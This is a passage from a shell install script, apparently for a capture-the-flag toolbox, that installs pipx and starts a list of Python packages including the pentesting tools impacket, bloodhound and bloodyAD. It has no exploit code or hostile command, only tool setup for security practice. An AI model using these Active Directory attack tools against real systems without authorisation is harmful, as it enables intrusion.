    DEBIAN_FRONTEND=noninteractive apt install -y pipx 2>&1 | tee -a /var/log/ctfbox-install.log || true
    pipx ensurepath || true
    export PATH="$PATH:/root/.local/bin:$USER_HOME/.local/bin"
fi

# Python packages via pip
PIP_TOOLS=(
    "impacket"
    "hashid"
    "featherduster"
    "bloodhound"
    "bloodyAD"
